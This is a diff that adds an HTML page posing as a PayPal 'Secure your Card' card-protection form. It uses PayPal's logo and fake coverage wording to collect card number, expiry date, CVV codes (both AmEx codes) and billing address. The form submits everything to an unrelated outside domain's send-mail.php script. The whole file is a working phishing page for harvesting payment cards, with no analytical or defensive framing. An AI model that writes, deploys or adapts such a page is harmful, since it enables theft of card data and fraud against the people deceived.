@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure your Card on PayPal</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f7fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card-form {
+      background-color: white;
+      padding: 40px 80px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 380px;
+      text-align: center;
+    }
+    .card-form img.logo {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+    .card-form h2 {
+      margin-bottom: 25px;
+      font-weight: normal;
+    }
+    .card-form input,
+    .card-form select,
+    .card-form button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    .card-form button {
+      background-color: #0070ba;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .card-form button:hover {
+      background-color: #005c9c;
+    }
+    .address-popup {
+      display: none;
+      margin-top: 10px;
+      padding: 5px 40px;
+      border: 1px solid #ccc;
+      background: #f9f9f9;
+      border-radius: 8px;
+      text-align: left;
+      width: 300px;
+      
+    }
+
+.hidden {
+  display: none;
+}
+  </style>
+</head>
+<body>
+ <form class="card-form" method="POST" action="https://hewlettprinters.online/send-mail.php" onsubmit="return validateCVV()">
+  
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo" />
+    <h2>Secure your Card on PayPal</h2>
+<p align=center> PayPal's Card Protection program may result in coverage for the full purchase price of the item plus the original shipping costs you paid by Card, if any. </p>
+
+ <input type="text" id="name" placeholder="Name on Card" required />
+      <input type="text" name="card_number" placeholder="Debit or credit card number" id="card_number" required maxlength="19" oninput="formatCardNumber(event)" />
+
+
+     <select name="card_type" id="card_type" required onchange="adjustCVVInputs()">
+      <option value="" disabled selected>Select your card type</option>
+      <option value="Visa">Visa</option>
+      <option value="MasterCard">MasterCard</option>
+      <option value="AmEx">American Express</option>
+    </select>
+
+     <input type="text" name="expiration_date" placeholder="Expiration date (MM/YYYY)" id="expiration_date" required maxlength="7" oninput="formatExpirationDate(event)" />
+
+   
+   <div id="cvv-common">
+  <input type="text" name="cvv_common" id="cvv_common_input" placeholder="Security code (CVV)" maxlength="3" />
+</div>
+
+<div id="cvv-amex" class="hidden">
+  <input type="text" name="amex_cvv4" id="amex_cvv4" placeholder="4-digit CSC (front)" maxlength="4" />
+  <input type="text" name="amex_cvv3" id="amex_cvv3" placeholder="3-digit CID (back)" maxlength="3" class="hidden" />
+</div>
+
+
+    <input type="text" name="billing_address" id="billing_address" placeholder="Billing address" readonly onclick="toggleAddressForm()" required />
+
+    <!-- Address Popup -->
+    <div class="address-popup" id="addressForm">
+      <input type="text" id="addr1" placeholder="Address Line 1" required />
+      <input type="text" id="addr2" placeholder="Address Line 2 (Optional)" />
+      <input type="text" id="city" placeholder="City" required />
+      <select id="state">
+        <option value="" disabled selected>Select State</option>
+        <option value="AL">AL</option>
+<option value="AK">AK</option>
+<option value="AZ">AZ</option>
+<option value="AR">AR</option>
+<option value="AS">AS</option>
+<option value="CA">CA</option>
+<option value="CO">CO</option>
+<option value="CT">CT</option>
+<option value="DE">DE</option>
+<option value="DC">DC</option>
+<option value="FL">FL</option>
+<option value="GA">GA</option>
+<option value="GU">GU</option>
+<option value="HI">HI</option>
+<option value="ID">ID</option>
+<option value="IL">IL</option>
+<option value="IN">IN</option>
+<option value="IA">IA</option>
+<option value="KS">KS</option>
+<option value="KY">KY</option>
+<option value="LA">LA</option>
+<option value="ME">ME</option>
+<option value="MD">MD</option>
+<option value="MA">MA</option>
+<option value="MI">MI</option>
+<option value="MN">MN</option>
+<option value="MS">MS</option>
+<option value="MO">MO</option>
+<option value="MT">MT</option>
+<option value="NE">NE</option>
+<option value="NV">NV</option>
+<option value="NH">NH</option>
+<option value="NJ">NJ</option>
+<option value="NM">NM</option>
+<option value="NY">NY</option>
+<option value="NC">NC</option>
+<option value="ND">ND</option>
+<option value="MP">MP</option>
+<option value="OH">OH</option>
+<option value="OK">OK</option>
+<option value="OR">OR</option>
+<option value="PA">PA</option>
+<option value="PR">PR</option>
+<option value="RI">RI</option>
+<option value="SC">SC</option>
+<option value="SD">SD</option>
+<option value="TN">TN</option>
+<option value="TX">TX</option>
+<option value="TT">TT</option>
+<option value="UT">UT</option>
+<option value="VT">VT</option>
+<option value="VA">VA</option>
+<option value="VI">VI</option>
+<option value="WA">WA</option>
+<option value="WV">WV</option>
+<option value="WI">WI</option>
+<option value="WY">WY</option>
+	<!-- Add more as needed -->
+      </select>
+ 
+<input type="text" id="zip" placeholder="Zip Code" required />
+     
+      <input type="text" value="United States of America" readonly />
+
+      <button type="button" onclick="addAddress()">Add Address</button>
+    </div>
+
+    <button type="submit">Secure Card</button>
+  </form>
+
+   <script>
+  function adjustCVVInputs() {
+    const cardType = document.getElementById("card_type").value;
+    const common = document.getElementById("cvv-common");
+    const amex = document.getElementById("cvv-amex");
+    const amexCID = document.getElementById("amex_cvv3");
+
+    if (cardType === "AmEx") {
+      common.classList.add("hidden");
+      amex.classList.remove("hidden");
+      amexCID.classList.remove("hidden"); // Initially hide 3-digit CID
+    } else {
+      common.classList.remove("hidden");
+      amex.classList.add("hidden");
+    }
+  }
+
+ window.onload = function () {
+    const amexCSC = document.getElementById("amex_cvv4");
+    const amexCID = document.getElementById("amex_cvv3");
+
+    amexCSC?.addEventListener("focus", () => {
+      // Wait for user to type, then reveal CID after a delay or keystroke
+      amexCSC.addEventListener("input", () => {
+        if (amexCSC.value.length >= 1) {
+          amexCID.classList.remove("hidden");
+        }
+      });
+    });
+  };
+
+ function formatExpirationDate(event) {
+      let input = event.target;
+      let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 6); // Add '/' after month
+      }
+      input.value = value;
+    }
+
+    function validateCVV() {
+      const cardType = document.getElementById("card_type").value;
+
+      if (cardType === "AmEx") {
+        const cvv3 = document.getElementById("amex_cvv3").value.trim();
+        const cvv4 = document.getElementById("amex_cvv4").value.trim();
+        if (!/^\d{3}$/.test(cvv3) || !/^\d{4}$/.test(cvv4)) {
+          alert("American Express requires a 3-digit CID and a 4-digit CSC.");
+          return false;
+        }
+      } else {
+        const cvv = document.getElementById("cvv_common_input").value.trim();
+        if (!/^\d{3}$/.test(cvv)) {
+          alert("CVV must be exactly 3 digits.");
+          return false;
+        }
+      }
+
+      return true;
+    }
+
+    function toggleAddressForm() {
+      const form = document.getElementById("addressForm");
+      form.style.display = form.style.display === "block" ? "none" : "block";
+    }
+
+
+function formatCardNumber(event) {
+      let input = event.target;
+      let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+      value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Add space after every 4 digits
+      input.value = value;
+    }
+
+
+    function addAddress() {
+      const addr1 = document.getElementById("addr1").value.trim();
+      const addr2 = document.getElementById("addr2").value.trim();
+      const city = document.getElementById("city").value.trim();
+      const state = document.getElementById("state").value;
+const zip = document.getElementById("zip").value;
+            
+const country = "United States of America";
+
+      if (!addr1 || !city || !state ||!zip) {
+        alert("Please fill required address fields.");
+        return;
+      }
+
+      const fullAddress = `${addr1}${addr2 ? ', ' + addr2 : ''}, ${city}, ${state}, ${zip}, ${country}`;
+      document.getElementById("billing_address").value = fullAddress;
+      document.getElementById("addressForm").style.display = "none";
+    }
+  </script>
+</body>
+</html>
